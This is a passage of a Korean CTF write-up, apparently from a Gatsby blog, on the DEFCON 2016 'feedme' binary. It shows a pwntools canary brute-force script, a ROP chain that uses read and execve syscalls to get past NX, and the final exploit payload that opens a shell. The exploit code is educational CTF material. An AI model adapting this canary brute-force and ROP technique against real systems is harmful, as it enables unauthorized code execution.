id=\"canary-brute-force\" style=\"position:relative;\"><a href=\"#canary-brute-force\" aria-label=\"canary brute force permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>canary brute-force</h2>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\">canary <span class=\"token operator\">=</span> <span class=\"token string\">'\\x00'</span>\nbuf <span class=\"token operator\">=</span> p8<span class=\"token punctuation\">(</span><span class=\"token number\">0x90</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token number\">0x20</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">get_canary</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">global</span> canary\n    <span class=\"token keyword\">for</span> _ <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        log<span class=\"token punctuation\">.</span>info<span class=\"token punctuation\">(</span><span class=\"token string\">\"byte_%d\"</span><span class=\"token operator\">%</span>_<span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">0xff</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n            p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"FEED ME!\\n\"</span><span class=\"token punctuation\">)</span>\n            len_byte <span class=\"token operator\">=</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>buf<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>canary<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token number\">1</span>\n            p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span><span class=\"token builtin\">chr</span><span class=\"token punctuation\">(</span>len_byte<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>buf <span class=\"token operator\">+</span> canary <span class=\"token operator\">+</span> <span class=\"token builtin\">chr</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n            res <span class=\"token operator\">=</span> p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">'Child exit.\\n'</span><span class=\"token punctuation\">)</span>\n            <span class=\"token keyword\">if</span> <span class=\"token string\">'YUM'</span> <span class=\"token keyword\">in</span> res<span class=\"token punctuation\">:</span>\n                canary <span class=\"token operator\">+=</span> <span class=\"token builtin\">chr</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span>\n                log<span class=\"token punctuation\">.</span>info<span class=\"token punctuation\">(</span><span class=\"token string\">\"canary: \"</span><span class=\"token operator\">+</span>canary<span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token string\">'hex'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n                <span class=\"token keyword\">break</span>\n    <span class=\"token keyword\">print</span> hexdump<span class=\"token punctuation\">(</span>canary<span class=\"token punctuation\">)</span></code></pre></div>\n<ul>\n<li>널 바이트는 알기 때문에 하위 3바이트를 기점으로 잡아 한 바이트 별로 <code class=\"language-text\">0xFF</code> 번 돌면서 값을 알아낼 수 가 있으며 앞에서 <code class=\"language-text\">feedme</code> 함수가 제대로 반환이 되어 <code class=\"language-text\">YUM</code> 문자열이 출력이 되었더라면 카나리값과 동일하다는 것을 확인할 수 있고 그와 반대로는 계속해서 루틴을 돌면서 찾게 될 것이다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 32.77777777777778%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAHCAIAAACHqfpvAAAACXBIWXMAAAsTAAALEwEAmpwYAAAA80lEQVQY04XPS26DMBQFUC+kGGw//8AmQCBEhSaG2PmpStPPrFL3v4wKtVKTSFGlM7i6enfw0Gb/NmzPq3By4dw++nD8cP7kwks4vHM9J3w2EQUVxW+eFAkYUCvUD76sW+9836+bfp3OKlPWpqypTDETMcgfGP5yDAozoHKBusETAp21C2trUIyKByoiIjCbju7QmHEqW9S5Mc3L1OYqy2qhU64xqOTu7HrswqFqe22riIgINAYd/2/6iMolcpuxahZN/5RwjhnFjN0CwAAxwEUJEY2JmCMfvvL82S4/pTly5bkON2S2U2avzO6i3IIalXn9BiUdR2W2npWVAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./15.png\"\n        title=\"./15.png\"\n        src=\"/static/d77afbaa9bcff8755d7b40e8ba15e892/37523/15.png\"\n        srcset=\"/static/d77afbaa9bcff8755d7b40e8ba15e892/e9ff0/15.png 180w,\n/static/d77afbaa9bcff8755d7b40e8ba15e892/f21e7/15.png 360w,\n/static/d77afbaa9bcff8755d7b40e8ba15e892/37523/15.png 720w,\n/static/d77afbaa9bcff8755d7b40e8ba15e892/c946b/15.png 805w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p>카나리 값 릭</p>\n<h2 id=\"rop-sceanario\" style=\"position:relative;\"><a href=\"#rop-sceanario\" aria-label=\"rop sceanario permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>ROP sceanario</h2>\n<ul>\n<li>NX 보호기법이 켜져 있기 때문에 메모리에서의 실행은 불가능하다 그렇기 때문에 ROP 해서 우회를 해야 하며 기본적으로 오버플로우를 발생 시켜 리턴 주소에 ROP 가젯을 집어넣어 EIP 조작을 진행해야 한다.</li>\n<li>라이브러리가 정적 링킹되어 있기 때문에 공유 라이브러리 상에서 필요한 함수를 가져올 수 가 없기 때문에 ROP를 바탕으로 SYS_CALL을 진행하여 exploit을 시도해야 한다.</li>\n</ul>\n<h2 id=\"rop시-필요한-sys_call\" style=\"position:relative;\"><a href=\"#rop%EC%8B%9C-%ED%95%84%EC%9A%94%ED%95%9C-sys_call\" aria-label=\"rop시 필요한 sys_call permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>ROP시 필요한 SYS_CALL</h2>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 44.44444444444444%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAJCAYAAAAywQxIAAAACXBIWXMAAAsTAAALEwEAmpwYAAACsElEQVQozzWLXUiTcRyFf9FFJBRvN3kV3RTRRaSYUbzYyixbZJlUdBFREZmR0V1QXUiRprSVizA/ynKZWm3O17BtTp2p/zbHlqy59sk+/NzmhMroj2kntuhcnefhHMrKkxWuzJKvw20iIqxYDZAWIMpAitN9I0CH8I9pAlQO0KUU/3cAyYEV2VIb0e639z+fMKrYKVPdSLHhEdvRqWS5mrvsyAcFO6qvZTs1FWm3W1vBig0qli/dY7naKpajrWF7u+6ykt4nLE93ZyRHq7BmdamfUr1rACYfw/uvw+jxDKF6zIR2/zD6QqMwBCzoCVtR5TBCH7bCGLRiIGJDo9uMR84+9Edt0Ps+YSBqQ6XDiK3a56CP05PL8/HkUnhqGsm5eaj9bkQXfiKZmMfE1Az4MvDS60IqwUgUy3wJtkQcUiQI/AbcgSDwB3gd9GDT24YZkjUqiy7oWuWXhvV5pZ96xWxNk3hAahFLmVEss5hEuaQWczqfiyU97eKV0X7xbH+XuE9qEXdon4lnTJ1iuX1QPG18J+7SNedt073YQFuOHSxec2DnfjpfkEk3i9ZmttULq1prBbpxTKAbxwVSK4T1HQ0CNd0R6HqhQIpyIaO1Vsh80ySQ8ppAV/MFqrslrO94uu7myCBRof7x9zLW/P3yUPOv8+Z6LutW8QKpmp8bqOMXzA38YHdV2h1+f59fHGziJw1Knt+t4DLpIS/RP+ClQ828uKfm1x6pdnG7ruUzGUIuBCJeOENueKNetAXG4ExGEY6F4ZnyY2ohjlc+O2YW4vBM+hH7NgvztA9dYRcSP2LpXzK18TuwRfMM9MLjXBwNBbk54OWWUJBXjll472SEW8Mh/jHg4/ZEjN9zMO5KzvE+71c+HpvlHUEPV7ns3JNIcP34F+5LJnmNc3Rp87vGkb8RH9JClSuOnAAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./16.png\"\n        title=\"./16.png\"\n        src=\"/static/94e1e9d90ac26ed0c210754be0fae5f1/37523/16.png\"\n        srcset=\"/static/94e1e9d90ac26ed0c210754be0fae5f1/e9ff0/16.png 180w,\n/static/94e1e9d90ac26ed0c210754be0fae5f1/f21e7/16.png 360w,\n/static/94e1e9d90ac26ed0c210754be0fae5f1/37523/16.png 720w,\n/static/94e1e9d90ac26ed0c210754be0fae5f1/798d4/16.png 976w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p>syscall</p>\n<ul>\n<li><code class=\"language-text\">/bin/sh</code> 문자열이 존재하지 않기 때문에 ROP를 바탕으로 read 함수로 입력을 받을 것이며 입력을 받게 되는데 NX 보호 기법을 우회하기 위해 <code class=\"language-text\">.bss</code> 섹션의 첫 번째 주소 부분에 데이터를 삽입할 것이다.</li>\n<li>마지막으로 execve syscall을 바탕으로 <code class=\"language-text\">.bss</code> 섹션에 존재하는 <code class=\"language-text\">/bin/sh</code> 문자열을 실행하게 된다면은 쉘을 딸 수 있겠다.</li>\n</ul>\n<h2 id=\"rop-code-gadget\" style=\"position:relative;\"><a href=\"#rop-code-gadget\" aria-label=\"rop code gadget permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>ROP Code Gadget</h2>\n<ul>\n<li>ROPgadget 도구를 사용하여 필요한 Gadget을 찾아 보겠다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 55.55555555555556%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAALCAYAAAB/Ca1DAAAACXBIWXMAAAsTAAALEwEAmpwYAAADH0lEQVQozzWOzWsjdRiAX9NdKqioXXF3W5Kmk8lMMjOZ+U0yme/MdzqZfKdtbENil5ZuWUVEPeh60IOKFz0p6P/gbaUnsSgomoNnr3sIIj1KtWDdnVcs+MDDc33ADuynAeD6dHT0/u5ohn2v+0fX2rzYCQcXPad9MbDji0Ej+TNyk9RrDrFuNlEgJvLERE7UUSAWlkX9SoavIyAivPn6W/DG5LU70+Hsl37N+2ZPi063at7p0IhP+1br244W/1QRnE8Zwdymy/rLOUqeZiky/b9ZikyyFNlbL1QnoDkGA889eePV6StfHu4eYLfu4kgPsWWE6NZd9Csa+pKJIm+9XauFIGox8EoIHHFBlhyQRQfWNgisrXOQpUQAzTWfAQDoD44Pt3aOvu92Zg+iaHwSx3sn0ebuSbM1edAdHJy2+3ffdcOpYkVTzxscO2683+g2Z04v3ncorr1ycxmALpnX4Ouv3oPRSwnsTI7faQ+2/9Gd6Lcg7p1Z3uaZ7oRngROe2Zb3e930zlXLR0OzHzuK8ViQ6o9EjjwSyyTNsbafZUygS1YGZneSpe3dFownR58kvQFWdRvdqIW230TP8bGpmSgrOhLVQKmmYlWQUKZZ5AsMrlE0Zgss0qzVLLA6UIyWgUbUWEb8C0bje/e6w+mvphr86OvRXG0kc0ML55Zsz8sVY84Tey5WnXmZ2HOBV3+WeXVOsfIPG0X5O7ocyHTJA7rkZkBzjZXbdO7F3tbR/SjZOlc0/6HjJguemIsyMReK6i2CeLSwvPaC4esLTjIWZVF/yAjqOSf6H+SZ61DV/Mzt9WcBlgHg8KDzRNwLIe5MPtYtF4tlCS03QkW3UZAU5CtVNBsBelGCPFEwS7GYK/wng3mafHErdwNeWIUlUrsPVwxd+9peEEDfHX/YsRPUOe3vQPFTW7RSg9dTRzDSZtVNdbmRbpRIulEU03yxcpkvVpBitc9W88/Dan5lSZDuAst1AeKOvdQeBBC1xh+FcYIFlr+0vQhV00GiaCiIVVSNBjbbfazpFrKChOs0e3l1WCSf38o9BTezyxlO3L86/BeJ7xtkOWSA0QAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./17.png\"\n        title=\"./17.png\"\n        src=\"/static/4edd80109d311430c02adc4c701b327d/37523/17.png\"\n        srcset=\"/static/4edd80109d311430c02adc4c701b327d/e9ff0/17.png 180w,\n/static/4edd80109d311430c02adc4c701b327d/f21e7/17.png 360w,\n/static/4edd80109d311430c02adc4c701b327d/37523/17.png 720w,\n/static/4edd80109d311430c02adc4c701b327d/302a4/17.png 1080w,\n/static/4edd80109d311430c02adc4c701b327d/48ca3/17.png 1084w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p>ROP Gadget</p>\n<h2 id=\"rop\" style=\"position:relative;\"><a href=\"#rop\" aria-label=\"rop permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>ROP</h2>\n<div class=\"gatsby-highlight\" data-language=\"c\"><pre class=\"language-c\"><code class=\"language-c\"><span class=\"token function\">read</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span><span class=\"token punctuation\">.</span>bss<span class=\"token punctuation\">,</span> <span class=\"token function\">length</span><span class=\"token punctuation\">(</span><span class=\"token operator\">/</span>bin<span class=\"token operator\">/</span>sh\\x00<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> \n\n<span class=\"token function\">execve</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">.</span>bss<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span></code></pre></div>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\"><span class=\"token comment\">#ROP</span>\npppr <span class=\"token operator\">=</span> <span class=\"token number\">0x806f370</span>\npeax <span class=\"token operator\">=</span> <span class=\"token number\">0x80bb496</span>\nsyscall <span class=\"token operator\">=</span> <span class=\"token number\">0x806fa20</span>\n    \n<span class=\"token comment\"># read</span>\nrop <span class=\"token operator\">=</span> p32<span class=\"token punctuation\">(</span>peax<span class=\"token punctuation\">)</span>\nrop <span class=\"token operator\">+=</span> p32<span class=\"token punctuation\">(</span><span class=\"token number\">0x3</span><span class=\"token punctuation\">)</span>\nrop <span class=\"token operator\">+=</span> p32<span class=\"token punctuation\">(</span>pppr<span class=\"token punctuation\">)</span>\nrop <span class=\"token operator\">+=</span> p32<span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/bin/sh\\x00\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nrop <span class=\"token operator\">+=</span> p32<span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">.</span>bss<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nrop <span class=\"token operator\">+=</span> p32<span class=\"token punctuation\">(</span><span class=\"token number\">0x0</span><span class=\"token punctuation\">)</span> \nrop <span class=\"token operator\">+=</span> p32<span class=\"token punctuation\">(</span>syscall<span class=\"token punctuation\">)</span>\n\n<span class=\"token comment\"># execve    </span>\nrop<span class=\"token operator\">+=</span> p32<span class=\"token punctuation\">(</span>peax<span class=\"token punctuation\">)</span>\nrop<span class=\"token operator\">+=</span> p32<span class=\"token punctuation\">(</span><span class=\"token number\">0xb</span><span class=\"token punctuation\">)</span>\nrop<span class=\"token operator\">+=</span> p32<span class=\"token punctuation\">(</span>pppr<span class=\"token punctuation\">)</span>\nrop<span class=\"token operator\">+=</span> p32<span class=\"token punctuation\">(</span><span class=\"token number\">0x0</span><span class=\"token punctuation\">)</span>\nrop<span class=\"token operator\">+=</span> p32<span class=\"token punctuation\">(</span><span class=\"token number\">0x0</span><span class=\"token punctuation\">)</span>\nrop<span class=\"token operator\">+=</span> p32<span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">.</span>bss<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nrop<span class=\"token operator\">+=</span> p32<span class=\"token punctuation\">(</span>syscall<span class=\"token punctuation\">)</span></code></pre></div>\n<h2 id=\"exploit\" style=\"position:relative;\"><a href=\"#exploit\" aria-label=\"exploit permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Exploit</h2>\n<div class=\"gatsby-highlight\" data-language=\"c\"><pre class=\"language-c\"><code class=\"language-c\">payload <span class=\"token operator\">=</span> <span class=\"token function\">p8</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x41</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token number\">0x20</span> <span class=\"token operator\">+</span> canary <span class=\"token operator\">+</span> <span class=\"token function\">p8</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x41</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token number\">0xC</span> <span class=\"token operator\">+</span> rop\n    \np<span class=\"token punctuation\">.</span><span class=\"token function\">send</span><span class=\"token punctuation\">(</span><span class=\"token function\">chr</span><span class=\"token punctuation\">(</span><span class=\"token function\">len</span><span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>payload<span class=\"token punctuation\">)</span>\np<span class=\"token punctuation\">.</span><span class=\"token function\">send</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/bin/sh\\x00\"</span><span class=\"token punctuation\">)</span>\np<span class=\"token punctuation\">.</span><span class=\"token function\">interactive</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></code></pre></div>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 44.44444444444444%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAJCAYAAAAywQxIAAAACXBIWXMAAAsTAAALEwEAmpwYAAACXUlEQVQoz23QX0hTcRQH8F/P9aDQm7i7+//eebc53dT9cas1lxuWD2blNG9IReCDRdFTEWUZrS3J6CUI9CHywaYJ9eBk6kwTWxrZMjYNYzfUoCRhWbu5E5spGT18OIfz8OWcg3YfcWuah57Oe8MhaB0JQl3wyd0Lg10oBN/Q/gMNnsrq+uP2Kk9jRVWd6HQfFh2uWlFnsIvFZQ6RE4yiktKJOFMk4vQGhIZu7Jp4E/0EsxJAfBHaJ0MDNaO+5sYHV72lVidYzDawW/aC3mACTXEZcOoiwJkCIFgBlLQKMIrfBqGWQ7md8bfSwuISvF/+DC3jvbETI3eiTT3eWLHZvipoCtd5lpUZgpbzcErOJ2hZQbJyPsFk678QOleb0xWbkaSFBMQ+SnD2Rf90Q+hWoOmxf9DqPPjdYLKCkhXSeQSTxiguS0FyaSXF/+nZrXkGQn2tOcMTEQnGovDrZQxujj177Rn2B0/3tY87XNVJQasHXqtPMwUawCgOFCSbRTAqUNJ8ts/MNyF070zOw1eTUuLdHMzNzsP5cO/UsXB7Z9OjtoDZVpE0Wu1gsu1Ll5ptQHEC5BPMVuhm2N+hCJ2qyu2X5qVkKgVffv6Ai5GB0Zrg9fv13dd6LPbKVbXOsC7oSlIUr5ZJVpBxRiWT3EbN/AyjuG0Quly3M/J1WYKVJMDaOvhnhqePDnpDJwO+SLnDBQXaItDqy4Dm1UCr1EByQhbOZM7dvm0G2uEuL+n+MJtYWktCfHUFrkw97wIAdKmjA7PuqW7j1MbbQqHFh5Fan4LU+jCqMEtJ63z4f/wGct1LIw4Q6ToAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./18.png\"\n        title=\"./18.png\"\n        src=\"/static/44e151bc7a69f5e6afa00e029e6e3a0f/37523/18.png\"\n        srcset=\"/static/44e151bc7a69f5e6afa00e029e6e3a0f/e9ff0/18.png 180w,\n/static/44e151bc7a69f5e6afa00e029e6e3a0f/f21e7/18.png 360w,\n/static/44e151bc7a69f5e6afa00e029e6e3a0f/37523/18.png 720w,\n/static/44e151bc7a69f5e6afa00e029e6e3a0f/302a4/18.png 1080w,\n/static/44e151bc7a69f5e6afa00e029e6e3a0f/07a9c/18.png 1440w,\n/static/44e151bc7a69f5e6afa00e029e6e3a0f/c4451/18.png 1450w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p>Exploit memory</p>\n<ul>\n<li>ROP 를 바탕으로 쉘 권한을 획득할 수 있는 것을 확인할 수 있다.</li>\n</ul>\n<div class=\"table-of-contents\">\n<ul>\n<li><a href=\"#%EB%B0%94%EC%9D%B4%EB%84%88%EB%A6%AC-%EA%B0%9C%EC%9A%94\">바이너리 개요</a></li>\n<li><a href=\"#%EB%B3%B4%ED%98%B8%EA%B8%B0%EB%B2%95\">보호기법</a></li>\n<li><a href=\"#%EB%B0%94%EC%9D%B4%EB%84%88%EB%A6%AC-%EB%B6%84%EC%84%9D\">바이너리 분석</a></li>\n<li><a href=\"#main-%ED%95%A8%EC%88%98-%EB%B6%84%EC%84%9D\">main 함수 분석</a></li>\n<li><a href=\"#sub_80490b0-%ED%95%A8%EC%88%98-%EB%B6%84%EC%84%9D\">sub_80490B0 함수 분석</a></li>\n<li><a href=\"#sub_804f700-feedme-%ED%95%A8%EC%88%98-%EB%B6%84%EC%84%9D\">sub_804F700 [feedme] 함수 분석</a></li>\n<li><a href=\"#sub_8048e42-read_byte-%ED%95%A8%EC%88%98-%EB%B6%84%EC%84%9D\">sub_8048E42 [read_byte] 함수 분석</a></li>\n<li><a href=\"#sub_8048e7e-next_read-%ED%95%A8%EC%88%98-%EB%B6%84%EC%84%9D\">sub_8048E7E [next_read] 함수 분석</a></li>\n<li><a href=\"#canary-%EB%B6%84%EC%84%9D\">canary 분석</a></li>\n<li><a href=\"#fork-%EB%B6%84%EC%84%9D\">fork 분석</a></li>\n<li><a href=\"#%EA%B3%B5%EA%B2%A9\">공격</a></li>\n<li><a href=\"#canary-brute-force\">canary brute-force</a></li>\n<li><a href=\"#rop-sceanario\">ROP sceanario</a></li>\n<li><a href=\"#rop%EC%8B%9C-%ED%95%84%EC%9A%94%ED%95%9C-sys_call\">ROP시 필요한 SYS_CALL</a></li>\n<li><a href=\"#rop-code-gadget\">ROP Code Gadget</a></li>\n<li><a href=\"#rop\">ROP</a></li>\n<li><a href=\"#exploit\">Exploit</a></li>\n</ul>\n</div>","frontmatter":{"date":"September 18, 2020","title":"DEFCON 2016 feedme 취약점 분석","categories":"CTF","author":"Zer0Luck","emoji":"🐷"},"fields":{"slug":"/defcon2016_feedme_ctf_writeup/"}},"prev":{"id":"81c9b852-12d0-5052-be3b-9d9f1ddd6ccf","html":"<h1 id=\"취약점-분석\" style=\"position:relative;\"><a href=\"#%EC%B7%A8%EC%95%BD%EC%A0%90-%EB%B6%84%EC%84%9D\" aria-label=\"취약점 분석 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>취약점 분석</h1>\n<h2 id=\"바이너리-개요\" style=\"position:relative;\"><a href=\"#%EB%B0%94%EC%9D%B4%EB%84%88%EB%A6%AC-%EA%B0%9C%EC%9A%94\" aria-label=\"바이너리 개요 permalink\" class=\"anchor 